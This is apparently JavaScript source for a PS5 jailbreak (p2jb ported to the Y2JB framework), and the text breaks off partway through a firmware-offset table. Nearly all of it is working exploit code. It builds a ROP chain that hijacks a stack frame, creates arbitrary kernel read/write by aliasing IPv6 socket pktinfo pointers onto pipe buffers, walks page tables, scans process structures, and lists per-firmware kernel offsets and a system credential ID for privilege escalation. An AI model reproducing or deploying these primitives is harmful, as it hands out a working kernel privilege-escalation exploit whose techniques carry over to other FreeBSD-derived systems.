/*
 * p2jb-y2jb - PS5 jailbreak port to Y2JB (YouTube/JS), tested on FW 11.60,
 *            offsets bundled for FW 9.00 - 12.40.
 * MIT License - see LICENSE.
 *
 * Credits:
 *   - p2jb kernel exploit (cr_ref overflow via kqueueex): Gezine / cheburek3000
 *     (https://github.com/Gezine/Luac0re)
 *   - Y2JB userland framework: Gezine (https://github.com/Gezine/Y2JB)
 *   - elfldr_1320 ELF loader binary: Gezine
 *   - notmaj0r remote_lua_loader p2jb port (secondary reference)
 *   - Edigax: multi-core leak implementation (~48 min vs ~2h)
 *
 * Usage: see README.md.
 */

PAGE_SIZE = 0x4000;
PHYS_PAGE_SIZE = 0x1000;

LIBC_HANDLE = 0x2n;
LIBKERNEL_HANDLE = 0x2001n;

let ROP = {
    get pop_rsp()             { return g.get('pop_rsp');               },
    get pop_rax()             { return g.get('pop_rax');               },
    get pop_rdi()             { return g.get('pop_rdi');               },
    get pop_rsi()             { return g.get('pop_rsi');               },
    get pop_rdx()             { return g.get('pop_rdx');               },
    get pop_rcx()             { return g.get('pop_rcx');               },
    get pop_r8()              { return g.get('pop_r8');                },
    get ret()                 { return g.get('ret');                   },
    get mov_qword_rdi_rax()   { return g.get('mov_qword_ptr_rdi_rax'); },
};

MAIN_CORE = 4;
MAIN_RTPRIO = 0x100;
NUM_WORKERS = 2;
NUM_GROOMS = 0x200;
NUM_HANDLES = 0x100;
NUM_SDS = 64;
NUM_SDS_ALT = 48;
NUM_RACES = 100;
NUM_ALIAS = 100;
LEAK_LEN = 16;
NUM_LEAKS = 16;
NUM_CLOBBERS = 8;
MAX_AIO_IDS = 0x80;

AIO_CMD_READ = 1n;
AIO_CMD_FLAG_MULTI = 0x1000n;
AIO_CMD_MULTI_READ = 0x1001n;
AIO_CMD_WRITE = 2n;
AIO_STATE_COMPLETE = 3n;
AIO_STATE_ABORTED = 4n;

SCE_KERNEL_ERROR_ESRCH = 0x80020003n;

RTP_SET = 1n;
PRI_REALTIME = 2n;

block_fd = 0xffffffffffffffffn;
unblock_fd = 0xffffffffffffffffn;
block_id = -1n;
groom_ids = null;
sds = null;
sds_alt = null;
prev_core = -1;
prev_rtprio = 0n;
ready_signal = 0n;
deletion_signal = 0n;
pipe_buf = 0n;

saved_fpu_ctrl = 0;
saved_mxcsr = 0;

/***** misc.js *****/
function find_pattern(buffer, pattern_string) {
    const parts = pattern_string.split(' ');
    const matches = [];

    for (let i = 0; i <= buffer.length - parts.length; i++) {
        let match = true;

        for (let j = 0; j < parts.length; j++) {
            if (parts[j] === '?') continue;
            if (buffer[i + j] !== parseInt(parts[j], 16)) {
                match = false;
                break;
            }
        }

        if (match) matches.push(i);
    }

    return matches;
}

function call_pipe_rop(fildes) {

    write64(add_rop_smash_code_store, 0xab0025n);
    real_rbp = addrof(rop_smash(1)) + 0x700000000n -1n +2n;

    let rop_i = 0;

    fake_rop[rop_i++] = g.get('pop_rax'); // pop rax ; ret
    fake_rop[rop_i++] = SYSCALL.pipe;
    fake_rop[rop_i++] = syscall_wrapper;

    // Store rax (read_fd) to fildes[0]
    fake_rop[rop_i++] = g.get('pop_rdi'); // pop rdi ; ret
    fake_rop[rop_i++] = fildes;
    fake_rop[rop_i++] = g.get('mov_qword_ptr_rdi_rax'); // mov qword [rdi], rax ; ret

    // Store rdx (write_fd) to fildes[4]
    fake_rop[rop_i++] = g.get('pop_rdi'); // pop rdi ; ret
    fake_rop[rop_i++] = fildes + 4n;
    fake_rop[rop_i++] = g.get('mov_qword_ptr_rdi_rdx'); // mov qword [rdi], rdx ; ret

    // Return safe tagged value to JavaScript
    fake_rop[rop_i++] = g.get('pop_rax'); // mov rax, 0x200000000 ; ret
    fake_rop[rop_i++] = 0x2000n;                   // Fake value in RAX to make JS happy
    fake_rop[rop_i++] = g.get('pop_rsp_pop_rbp');
    fake_rop[rop_i++] = real_rbp;

    write64(add_rop_smash_code_store, 0xab00260325n);
    oob_arr[39] = base_heap_add + fake_frame;
    return rop_smash(obj_arr[0]);          // Call ROP
}

function create_pipe() {
    const fildes = malloc(0x10);

    call_pipe_rop(fildes);

    const read_fd = read32_uncompressed(fildes);
    const write_fd = read32_uncompressed(fildes + 4n);
    //logger.log("This are the created pipes: " + hex(read_fd) + " " + hex(write_fd));
    return [read_fd, write_fd];
}

function read_buffer(addr, len) {
    const buffer = new Uint8Array(len);
    for (let i = 0; i < len; i++) {
        buffer[i] = Number(read8_uncompressed(addr + BigInt(i)));
    }
    return buffer;
}

function write_buffer(addr, buffer) {
    for (let i = 0; i < buffer.length; i++) {
        write8_uncompressed(addr + BigInt(i), buffer[i]);
    }
}

function get_nidpath() {
    const path_buffer = malloc(0x255);
    const len_ptr = malloc(8);

    write64_uncompressed(len_ptr, 0x255n);

    const ret = syscall(SYSCALL.randomized_path, 0n, path_buffer, len_ptr);
    if (ret === 0xffffffffffffffffn) {
        throw new Error("randomized_path failed : " + hex(ret));
    }

    return read_cstring(path_buffer);
}

function check_jailbroken() {
    if (!is_jailbroken()) {
        throw new Error("process is not jailbroken");
    }
}

function file_exists(path) {
    const path_addr = alloc_string(path);
    const fd = syscall(SYSCALL.open, path_addr, O_RDONLY);

    if (fd !== 0xffffffffffffffffn) {
        syscall(SYSCALL.close, fd);
        return true;
    } else {
        return false;
    }
}

function read_file(path) {
    const path_addr = alloc_string(path);
    const fd = syscall(SYSCALL.open, path_addr, O_RDONLY);

    if (fd === 0xffffffffffffffffn) {
        throw new Error("file not exist: " + path);
    }

    const stat_buf = malloc(0x100);
    const fstat_result = syscall(SYSCALL.fstat, fd, stat_buf);
    if (fstat_result === 0xffffffffffffffffn) {
        syscall(SYSCALL.close, fd);
        throw new Error("fstat failed for: " + path);
    }

    const file_size = read64_uncompressed(stat_buf + 0x48n);

    const buffer = malloc(Number(file_size));
    const bytes_read = syscall(SYSCALL.read, fd, buffer, file_size);

    syscall(SYSCALL.close, fd);

    if (bytes_read !== file_size) {
        throw new Error("failed to read complete file: " + path);
    }

    return read_buffer(buffer, Number(file_size));
}

function write_file(path, text) {
    const mode = 0x1ffn; // 777
    const path_addr = alloc_string(path);
    const data_addr = alloc_string(text);

    const flags = O_CREAT | O_WRONLY | O_TRUNC;
    const fd = syscall(SYSCALL.open, path_addr, flags, mode);

    if (fd === 0xffffffffffffffffn) {
        throw new Error("open failed for " + path + " fd: " + hex(fd));
    }

    const written = syscall(SYSCALL.write, fd, data_addr, BigInt(text.length));
    if (written === 0xffffffffffffffffn) {
        syscall(SYSCALL.close, fd);
        throw new Error("write failed : " + hex(written));
    }

    syscall(SYSCALL.close, fd);
    return Number(written); // number of bytes written
}

function write_file_binary(path, data) {
    const path_addr = alloc_string(path);
    const fd = syscall(SYSCALL.open, path_addr, O_CREAT | O_WRONLY | O_TRUNC, 0x1ffn);
    if (fd === 0xffffffffffffffffn) throw new Error("open failed: " + path);
    const buf = malloc(data.length);
    write_buffer(buf, data);
    const written = syscall(SYSCALL.write, fd, buf, BigInt(data.length));
    syscall(SYSCALL.close, fd);
    if (written !== BigInt(data.length)) throw new Error("write incomplete: " + written + " of " + data.length);
    return Number(written);
}

function copy_file(src, dst) {
    const CHUNK = 0x10000n; // 64KB chunks - avoids large V8 heap allocation
    const src_fd = syscall(SYSCALL.open, alloc_string(src), O_RDONLY);
    if (src_fd === 0xffffffffffffffffn) throw new Error("open failed: " + src);

    const dst_fd = syscall(SYSCALL.open, alloc_string(dst), O_CREAT | O_WRONLY | O_TRUNC, 0x1ffn);
    if (dst_fd === 0xffffffffffffffffn) {
        syscall(SYSCALL.close, src_fd);
        throw new Error("open failed: " + dst);
    }

    const buf = malloc(Number(CHUNK));
    let total = 0;
    while (true) {
        const nr = syscall(SYSCALL.read, src_fd, buf, CHUNK);
        if (nr === 0n || nr === 0xffffffffffffffffn) break;
        const nw = syscall(SYSCALL.write, dst_fd, buf, nr);
        if (nw !== nr) {
            syscall(SYSCALL.close, src_fd);
            syscall(SYSCALL.close, dst_fd);
            throw new Error("write failed at offset " + total);
        }
        total += Number(nr);
    }
    syscall(SYSCALL.close, src_fd);
    syscall(SYSCALL.close, dst_fd);
    return total;
}

function usb_is_mounted(u) {
    // Compare st_dev of /mnt/usbX against /mnt — if they differ, a filesystem is mounted there
    const mnt_stat = malloc(0x100);
    const usb_stat = malloc(0x100);
    const r1 = syscall(SYSCALL.stat, alloc_string("/mnt"), mnt_stat);
    const r2 = syscall(SYSCALL.stat, alloc_string("/mnt/usb" + u), usb_stat);
    if (r1 === 0xffffffffffffffffn || r2 === 0xffffffffffffffffn) return false;
    return read64_uncompressed(mnt_stat) !== read64_uncompressed(usb_stat);
}

/***** kernel.js *****/
kernel = {
    addr: {},
    copyout: null,
    copyin: null,
    read_buffer: null,
    write_buffer: null
};

kernel.read_byte = function(kaddr) {
    const value = kernel.read_buffer(kaddr, 1);
    return value && value.length === 1 ? BigInt(value[0]) : null;
};

kernel.read_word = function(kaddr) {
    const value = kernel.read_buffer(kaddr, 2);
    if (!value || value.length !== 2) return null;
    return BigInt(value[0]) | (BigInt(value[1]) << 8n);
};

kernel.read_dword = function(kaddr) {
    const value = kernel.read_buffer(kaddr, 4);
    if (!value || value.length !== 4) return null;
    let result = 0n;
    for (let i = 0; i < 4; i++) {
        result |= (BigInt(value[i]) << BigInt(i * 8));
    }
    return result;
};

kernel.read_qword = function(kaddr) {
    const value = kernel.read_buffer(kaddr, 8);
    if (!value || value.length !== 8) return null;
    let result = 0n;
    for (let i = 0; i < 8; i++) {
        result |= (BigInt(value[i]) << BigInt(i * 8));
    }
    return result;
};

kernel.read_null_terminated_string = function(kaddr) {
    //const decoder = new TextDecoder('utf-8');
    let result = "";

    while (true) {
        const chunk = kernel.read_buffer(kaddr, 0x8);
        if (!chunk || chunk.length === 0) break;

        let null_pos = -1;
        for (let i = 0; i < chunk.length; i++) {
            if (chunk[i] === 0) {
                null_pos = i;
                break;
            }
        }

        if (null_pos >= 0) {
            if (null_pos > 0) {
                for(let i = 0; i < null_pos; i++)
                {
                    result += String.fromCharCode(Number(chunk[i]));
                }
            }
            return result;
        }

        for(let i = 0; i < chunk.length; i++)
        {
            result += String.fromCharCode(Number(chunk[i]));
        }

        kaddr = kaddr + BigInt(chunk.length);
    }

    return result;
};

kernel.write_byte = function(dest, value) {
    const buf = new Uint8Array(1);
    buf[0] = Number(value & 0xFFn);
    kernel.write_buffer(dest, buf);
};

kernel.write_word = function(dest, value) {
    const buf = new Uint8Array(2);
    buf[0] = Number(value & 0xFFn);
    buf[1] = Number((value >> 8n) & 0xFFn);
    kernel.write_buffer(dest, buf);
};

kernel.write_dword = function(dest, value) {
    const buf = new Uint8Array(4);
    for (let i = 0; i < 4; i++) {
        buf[i] = Number((value >> BigInt(i * 8)) & 0xFFn);
    }
    kernel.write_buffer(dest, buf);
};

kernel.write_qword = function(dest, value) {
    const buf = new Uint8Array(8);
    for (let i = 0; i < 8; i++) {
        buf[i] = Number((value >> BigInt(i * 8)) & 0xFFn);
    }
    kernel.write_buffer(dest, buf);
};

ipv6_kernel_rw = {
    data: {},
    ofiles: null,
    kread8: null,
    kwrite8: null
};

ipv6_kernel_rw.init = function(ofiles, kread8, kwrite8) {
    ipv6_kernel_rw.ofiles = ofiles;
    ipv6_kernel_rw.kread8 = kread8;
    ipv6_kernel_rw.kwrite8 = kwrite8;

    ipv6_kernel_rw.create_pipe_pair();
    ipv6_kernel_rw.create_overlapped_ipv6_sockets();
};

ipv6_kernel_rw.get_fd_data_addr = function(fd) {
    const filedescent_addr = ipv6_kernel_rw.ofiles + BigInt(fd) * kernel_offset.SIZEOF_OFILES;
    const file_addr = ipv6_kernel_rw.kread8(filedescent_addr + 0x0n);
    return ipv6_kernel_rw.kread8(file_addr + 0x0n);
};

ipv6_kernel_rw.create_pipe_pair = function() {
    const [read_fd, write_fd] = create_pipe();

    ipv6_kernel_rw.data.pipe_read_fd = read_fd;
    ipv6_kernel_rw.data.pipe_write_fd = write_fd;
    ipv6_kernel_rw.data.pipe_addr = ipv6_kernel_rw.get_fd_data_addr(read_fd);
    ipv6_kernel_rw.data.pipemap_buffer = malloc(0x14);
    ipv6_kernel_rw.data.read_mem = malloc(PAGE_SIZE);
};

ipv6_kernel_rw.create_overlapped_ipv6_sockets = function() {
    const master_target_buffer = malloc(0x14);
    const slave_buffer = malloc(0x14);
    const pktinfo_size_store = malloc(0x8);

    write64_uncompressed(pktinfo_size_store, 0x14n);

    const master_sock = syscall(SYSCALL.socket, AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
    const victim_sock = syscall(SYSCALL.socket, AF_INET6, SOCK_DGRAM, IPPROTO_UDP);

    syscall(SYSCALL.setsockopt, master_sock, IPPROTO_IPV6, IPV6_PKTINFO, master_target_buffer, 0x14n);
    syscall(SYSCALL.setsockopt, victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, slave_buffer, 0x14n);

    const master_so = ipv6_kernel_rw.get_fd_data_addr(master_sock);
    const master_pcb = ipv6_kernel_rw.kread8(master_so + kernel_offset.SO_PCB);
    const master_pktopts = ipv6_kernel_rw.kread8(master_pcb + kernel_offset.INPCB_PKTOPTS);

    const slave_so = ipv6_kernel_rw.get_fd_data_addr(victim_sock);
    const slave_pcb = ipv6_kernel_rw.kread8(slave_so + kernel_offset.SO_PCB);
    const slave_pktopts = ipv6_kernel_rw.kread8(slave_pcb + kernel_offset.INPCB_PKTOPTS);

    ipv6_kernel_rw.kwrite8(master_pktopts + 0x10n, slave_pktopts + 0x10n);

    ipv6_kernel_rw.data.master_target_buffer = master_target_buffer;
    ipv6_kernel_rw.data.slave_buffer = slave_buffer;
    ipv6_kernel_rw.data.pktinfo_size_store = pktinfo_size_store;
    ipv6_kernel_rw.data.master_sock = master_sock;
    ipv6_kernel_rw.data.victim_sock = victim_sock;
};

ipv6_kernel_rw.ipv6_write_to_victim = function(kaddr) {
    write64_uncompressed(ipv6_kernel_rw.data.master_target_buffer, kaddr);
    write64_uncompressed(ipv6_kernel_rw.data.master_target_buffer + 0x8n, 0n);
    write32_uncompressed(ipv6_kernel_rw.data.master_target_buffer + 0x10n, 0n);
    syscall(SYSCALL.setsockopt, ipv6_kernel_rw.data.master_sock, IPPROTO_IPV6,
            IPV6_PKTINFO, ipv6_kernel_rw.data.master_target_buffer, 0x14n);
};

ipv6_kernel_rw.ipv6_kread = function(kaddr, buffer_addr) {
    ipv6_kernel_rw.ipv6_write_to_victim(kaddr);
    syscall(SYSCALL.getsockopt, ipv6_kernel_rw.data.victim_sock, IPPROTO_IPV6,
            IPV6_PKTINFO, buffer_addr, ipv6_kernel_rw.data.pktinfo_size_store);
};

ipv6_kernel_rw.ipv6_kwrite = function(kaddr, buffer_addr) {
    ipv6_kernel_rw.ipv6_write_to_victim(kaddr);
    syscall(SYSCALL.setsockopt, ipv6_kernel_rw.data.victim_sock, IPPROTO_IPV6,
            IPV6_PKTINFO, buffer_addr, 0x14n);
};

ipv6_kernel_rw.ipv6_kread8 = function(kaddr) {
    ipv6_kernel_rw.ipv6_kread(kaddr, ipv6_kernel_rw.data.slave_buffer);
    return read64_uncompressed(ipv6_kernel_rw.data.slave_buffer);
};

ipv6_kernel_rw.copyout = function(kaddr, uaddr, len) {
   if (kaddr === null || kaddr === undefined ||
       uaddr === null || uaddr === undefined ||
       len === null || len === undefined || len === 0n) {
       throw new Error("copyout: invalid arguments");
   }

    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer, 0x4000000040000000n);
    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 0x8n, 0x4000000000000000n);
    write32_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 0x10n, 0n);
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr, ipv6_kernel_rw.data.pipemap_buffer);

    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer, kaddr);
    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 0x8n, 0n);
    write32_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 0x10n, 0n);
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr + 0x10n, ipv6_kernel_rw.data.pipemap_buffer);

    syscall(SYSCALL.read, ipv6_kernel_rw.data.pipe_read_fd, uaddr, len);
};

ipv6_kernel_rw.copyin = function(uaddr, kaddr, len) {
   if (kaddr === null || kaddr === undefined ||
       uaddr === null || uaddr === undefined ||
       len === null || len === undefined || len === 0n) {
       throw new Error("copyout: invalid arguments");
   }


    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer, 0n);
    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 0x8n, 0x4000000000000000n);
    write32_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 0x10n, 0n);
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr, ipv6_kernel_rw.data.pipemap_buffer);

    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer, kaddr);
    write64_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 0x8n, 0n);
    write32_uncompressed(ipv6_kernel_rw.data.pipemap_buffer + 0x10n, 0n);
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr + 0x10n, ipv6_kernel_rw.data.pipemap_buffer);

    syscall(SYSCALL.write, ipv6_kernel_rw.data.pipe_write_fd, uaddr, len);
};

ipv6_kernel_rw.read_buffer = function(kaddr, len) {
    let mem = ipv6_kernel_rw.data.read_mem;
    if (len > PAGE_SIZE) {
        mem = malloc(len);
    }

    ipv6_kernel_rw.copyout(kaddr, mem, BigInt(len));
    return read_buffer(mem, len);
};

ipv6_kernel_rw.write_buffer = function(kaddr, buf) {
    const temp_addr = malloc(buf.length);
    write_buffer(temp_addr, buf);
    ipv6_kernel_rw.copyin(temp_addr, kaddr, BigInt(buf.length));
};

// CPU page table definitions
CPU_PDE_SHIFT = {
    PRESENT: 0,
    RW: 1,
    USER: 2,
    WRITE_THROUGH: 3,
    CACHE_DISABLE: 4,
    ACCESSED: 5,
    DIRTY: 6,
    PS: 7,
    GLOBAL: 8,
    XOTEXT: 58,
    PROTECTION_KEY: 59,
    EXECUTE_DISABLE: 63
};

CPU_PDE_MASKS = {
    PRESENT: 1n,
    RW: 1n,
    USER: 1n,
    WRITE_THROUGH: 1n,
    CACHE_DISABLE: 1n,
    ACCESSED: 1n,
    DIRTY: 1n,
    PS: 1n,
    GLOBAL: 1n,
    XOTEXT: 1n,
    PROTECTION_KEY: 0xfn,
    EXECUTE_DISABLE: 1n
};

CPU_PG_PHYS_FRAME = 0x000ffffffffff000n;
CPU_PG_PS_FRAME = 0x000fffffffe00000n;

function cpu_pde_field(pde, field) {
    const shift = CPU_PDE_SHIFT[field];
    const mask = CPU_PDE_MASKS[field];
    return Number((pde >> BigInt(shift)) & mask);
}

function cpu_walk_pt(cr3, vaddr) {
    if (!vaddr || !cr3) {
        throw new Error("cpu_walk_pt: invalid arguments");
    }

    const pml4e_index = (vaddr >> 39n) & 0x1ffn;
    const pdpe_index = (vaddr >> 30n) & 0x1ffn;
    const pde_index = (vaddr >> 21n) & 0x1ffn;
    const pte_index = (vaddr >> 12n) & 0x1ffn;

    const pml4e = kernel.read_qword(phys_to_dmap(cr3) + pml4e_index * 8n);
    if (cpu_pde_field(pml4e, "PRESENT") !== 1) {
        return null;
    }

    const pdp_base_pa = pml4e & CPU_PG_PHYS_FRAME;
    const pdpe_va = phys_to_dmap(pdp_base_pa) + pdpe_index * 8n;
    const pdpe = kernel.read_qword(pdpe_va);

    if (cpu_pde_field(pdpe, "PRESENT") !== 1) {
        return null;
    }

    const pd_base_pa = pdpe & CPU_PG_PHYS_FRAME;
    const pde_va = phys_to_dmap(pd_base_pa) + pde_index * 8n;
    const pde = kernel.read_qword(pde_va);

    if (cpu_pde_field(pde, "PRESENT") !== 1) {
        return null;
    }

    if (cpu_pde_field(pde, "PS") === 1) {
        return (pde & CPU_PG_PS_FRAME) | (vaddr & 0x1fffffn);
    }

    const pt_base_pa = pde & CPU_PG_PHYS_FRAME;
    const pte_va = phys_to_dmap(pt_base_pa) + pte_index * 8n;
    const pte = kernel.read_qword(pte_va);

    if (cpu_pde_field(pte, "PRESENT") !== 1) {
        return null;
    }

    return (pte & CPU_PG_PHYS_FRAME) | (vaddr & 0x3fffn);
}

function is_kernel_rw_available() {
    return kernel.read_buffer && kernel.write_buffer;
}

function check_kernel_rw() {
    if (!is_kernel_rw_available()) {
        throw new Error("kernel r/w is not available");
    }
}

function find_proc_by_name(name) {
    check_kernel_rw();
    if (!kernel.addr.allproc) {
        throw new Error("kernel.addr.allproc not set");
    }

    let proc = kernel.read_qword(kernel.addr.allproc);
    while (proc !== 0n) {
        const proc_name = kernel.read_null_terminated_string(proc + kernel_offset.PROC_COMM);
        if (proc_name === name) {
            return proc;
        }
        proc = kernel.read_qword(proc + 0x0n);
    }

    return null;
}

function find_proc_by_pid(pid) {
    check_kernel_rw();
    if (!kernel.addr.allproc) {
        throw new Error("kernel.addr.allproc not set");
    }

    const target_pid = BigInt(pid);
    let proc = kernel.read_qword(kernel.addr.allproc);
    while (proc !== 0n) {
        const proc_pid = kernel.read_dword(proc + kernel_offset.PROC_PID);
        if (proc_pid === target_pid) {
            return proc;
        }
        proc = kernel.read_qword(proc + 0x0n);
    }

    return null;
}

function get_proc_cr3(proc) {
    check_kernel_rw();

    const vmspace = kernel.read_qword(proc + kernel_offset.PROC_VM_SPACE);
    const pmap_store = kernel.read_qword(vmspace + kernel_offset.VMSPACE_VM_PMAP);
    return kernel.read_qword(pmap_store + kernel_offset.PMAP_CR3);
}

function virt_to_phys(virt_addr, cr3) {
    check_kernel_rw();
    if (!kernel.addr.dmap_base)
        throw new Error("virt_to_phys: no kernel.addr.dmap_base");
    if (!virt_addr)
        throw new Error("virt_to_phys: no virt_addr");
    cr3 = cr3 || kernel.addr.kernel_cr3;
    return cpu_walk_pt(cr3, virt_addr);
}

function phys_to_dmap(phys_addr) {
    if (!kernel.addr.dmap_base)
        throw new Error("phys_to_dmap: no kernel.addr.dmap_base");
    if (!phys_addr)
        throw new Error("phys_to_dmap: no phys_addr");
    return kernel.addr.dmap_base + phys_addr;
}

function find_vmspace_pmap_offset() {
    const vmspace = kernel.read_qword(kernel.addr.curproc + kernel_offset.PROC_VM_SPACE);

    // Note, this is the offset of vm_space.vm_map.pmap on 1.xx.
    // It is assumed that on higher firmwares it's only increasing'
    const cur_scan_offset = 0x1C8n;

    for (let i = 1; i <= 6; i++) {
        const scan_val = kernel.read_qword(vmspace + cur_scan_offset + BigInt(i * 8));
        const offset_diff = Number(scan_val - vmspace);

        if (offset_diff >= 0x2C0 && offset_diff <= 0x2F0) {
            return cur_scan_offset + BigInt(i * 8);
        }
    }

    throw new Error("failed to find VMSPACE_VM_PMAP offset");
}


function find_vmspace_vmid_offset() {
    const vmspace = kernel.read_qword(kernel.addr.curproc + kernel_offset.PROC_VM_SPACE);

    // Note, this is the offset of vm_space.vm_map.vmid on 1.xx.
    // It is assumed that on higher firmwares it's only increasing'
    const cur_scan_offset = 0x1D4n;

    for (let i = 1; i <= 8; i++) {
        const scan_offset = cur_scan_offset + BigInt(i * 4);
        const scan_val = Number(kernel.read_dword(vmspace + scan_offset));

        if (scan_val > 0 && scan_val <= 0x10) {
            return scan_offset;
        }
    }

    throw new Error("failed to find VMSPACE_VM_VMID offset");
}

function find_proc_offsets() {
    const proc_data = kernel.read_buffer(kernel.addr.curproc, 0x1000);

    const p_comm_sign = find_pattern(proc_data, "ce fa ef be cc bb");
    const p_sysent_sign = find_pattern(proc_data, "ff ff ff ff ff ff ff 7f");

    if (p_comm_sign.length === 0) {
        throw new Error("failed to find offset for PROC_COMM");
    }

    if (p_sysent_sign.length === 0) {
        throw new Error("failed to find offset for PROC_SYSENT");
    }

    const p_comm_offset = BigInt(p_comm_sign[0] + 0x8);
    const p_sysent_offset = BigInt(p_sysent_sign[0] - 0x10);

    return {
        PROC_COMM: p_comm_offset,
        PROC_SYSENT: p_sysent_offset
    };
}

function find_additional_offsets() {
    const proc_offsets = find_proc_offsets();

    const vm_map_pmap_offset = find_vmspace_pmap_offset();
    const vm_map_vmid_offset = find_vmspace_vmid_offset();

    return {
        PROC_COMM: proc_offsets.PROC_COMM,
        PROC_SYSENT: proc_offsets.PROC_SYSENT,
        VMSPACE_VM_PMAP: vm_map_pmap_offset,
        VMSPACE_VM_VMID: vm_map_vmid_offset,
    };
}

function update_kernel_offsets() {
    const offsets = find_additional_offsets();

    for (const [key, value] of Object.entries(offsets)) {
        kernel_offset[key] = value;
    }
}


(function () {
    try {
        const p2jb_version = "P2JB 2.6 (Y2JB -> NFJB port by wodz69)";

        const PAGE_SIZE = 0x4000;

        const AF_UNIX = 1n;
        const AF_INET6 = 28n;
        const SOCK_STREAM = 1n;
        const IPPROTO_IPV6 = 41n;
        const IPV6_RTHDR = 51n;

        const SOL_SOCKET = 0xffffn;
        const SO_SNDBUF = 0x1001n;

        const RTP_SET = 1n;
        const PRI_REALTIME = 2n;

        const F_SETFL = 4n;
        const O_NONBLOCK = 4n;

        const UMTX_OP_WAIT = 2n;
        const UMTX_OP_WAKE = 3n;
        const SYSTEM_AUTHID = 0x4800000000010003n;

        const UCRED_SIZE = 360;
        const RTHDR_TAG = 0x13370000;
        const MSG_IOV_NUM = 23;
        const IOV_THREAD_NUM = 4;
        const UIO_THREAD_NUM = 4;
        const UIO_IOV_COUNT = 20n;

        const UIO_SYSSPACE = 1n;

        const TRIPLEFREE_ATTEMPTS = 96;
        const MAX_ROUNDS_TWIN = 10;
        const MAX_ROUNDS_TRIPLET = 500;
        const FIND_TRIPLET_FAST = 5000;
        const NUM_IPV6_SOCKETS = 64;
        const MAIN_CORE = 4;
        const MAIN_RTPRIO = 256;

        const LEAK_CORES = [0, 1];

        const ENABLE_DEBUG_MENU = true;

        const SYSCALL_EXTRA = {
            recvmsg: 0x1bn,
            socketpair: 0x87n,
            kqueue: 0x16an,
            kqueueex: 0x8Dn,
            readv: 0x78n,
            writev: 0x79n,
            setrlimit: 0xC3n,
        };
        for (const k in SYSCALL_EXTRA) {
            if (!(k in SYSCALL)) SYSCALL[k] = SYSCALL_EXTRA[k];
        }

        const FW_OFFSETS_P2JB = {
            "9.00": {
                DATA_BASE_ALLPROC: 0x02755D50n,
                DATA_BASE_SECURITY_FLAGS: 0x00D72064n,
                DATA_BASE_KERNEL_PMAP_STORE: 0x02D28B78n,
                DATA_BASE_GVMSPACE: 0x02D8A570n
            },
            "9.05": {
                DATA_BASE_ALLPROC: 0x02755D50n,
                DATA_BASE_SECURITY_FLAGS: 0x00D73064n,
                DATA_BASE_KERNEL_PMAP_STORE: 0x02D28B78n,
                DATA_BASE_GVMSPACE: 0x02D8A570n
            },
            "10.00": {
                DATA_BASE_ALLPROC: 0x02765D70n,
                DATA_BASE_SECURITY_FLAGS: 0x00D79064n,
                DATA_BASE_KERNEL_PMAP_STORE: 0x02CF0EF8n,
                DATA_BASE_GVMSPACE: 0x02D52570n
            },
            "11.00": {
                DATA_BASE_ALLPROC: 0x02875D70n,
                DATA_BASE_SECURITY_FLAGS: 0x00D8C064n,
                DATA_BASE_KERNEL_PMAP_STORE: 0x02E04F18n,
                DATA_BASE_GVMSPACE: 0x02E66570n
            },
            "12.00": {
                DATA_BASE_ALLPROC: 0x02885E00n,
                DATA_BASE_SECURITY_FLAGS: 0x00D83064n,
                DATA_BASE_KERNEL_PMAP_STORE: 0x02E1CFB8n,
                DATA_BASE_GVMSPACE: 0x02E7E570n
            },
        };
        const FW_ALIAS_P2JB = {
            "9.00": "9.00",
            "9.20": "9.05", "9.40": "9.05", "9.60": "9.05",
            "10.00": "10.00", "10.01": "10.00", "10.20": "10.00", "10.40": "10.00", "10.60": "10.00",
            "11.00": "11.00", "11.20": "11.00", "11.40": "11.00", "11.60": "11.00",
            "12.00": "12.00", "12.02": "12.00", "12.20": "12.00", "12.40": "12.00",
            "12.60": "12.00", "12.70": "12.00",
        };

        function ensure_kernel_offset() {

            let key = FW_VERSION;
            if (FW_ALIAS_P2JB[key]) key = FW_ALIAS_P2JB[key];
            let fw = FW_OFFSETS_P2JB[key];
            if (!fw) {
                const major = FW_VERSION.split(".")[0];
                fw = FW_OFFSETS_P2JB[major + ".00"];
            }
            if (!fw) throw new Error("p2jb: FW " + FW_VERSION + " not supported");

            kernel_offset = {
                DATA_BASE_ALLPROC: fw.DATA_BASE_ALLPROC,

                PROC_PID: 0xBCn, PROC_UCRED: 0x40n, PROC_FD: 0x48n,
                PROC_VM_SPACE: 0x200n,
                PROC_COMM: -1n, PROC_SYSENT: -1n,

                UCRED_CR_UID: 0x04n, UCRED_CR_RUID: 0x08n, UCRED_CR_SVUID: 0x0Cn,
                UCRED_CR_NGROUPS: 0x10n, UCRED_CR_RGID: 0x14n,
                UCRED_CR_SVGID: 0x18n,
                UCRED_CR_SCEAUTHID: 0x58n, UCRED_CR_SCECAPS0: 0x60n,
                UCRED_CR_SCECAPS1: 0x68n,

                FILEDESC_OFILES: 0x00n, FDESCENTTBL_HDR: 0x08n,
                FILEDESCENT_SIZE: 0x30n,
                SIZEOF_OFILES: 0x30n,

                FD_CDIR: 0x08n, FD_RDIR: 0x10n, FD_JDIR: 0x18n, KQ_FDP: 0xA8n,

                SO_PCB: 0x18n,

                INPCB_PKTOPTS: 0x120n, IP6PO_RTHDR: 0x70n,

                PIPE_SIGIO: 0xD8n,

                PMAP_PML4: 0x20n, PMAP_CR3: 0x28n,

                SIZEOF_GVMSPACE: 0x100n,
                GVMSPACE_START_VA: 0x08n,
                GVMSPACE_SIZE: 0x10n,
                GVMSPACE_PAGE_DIR_VA: 0x38n,

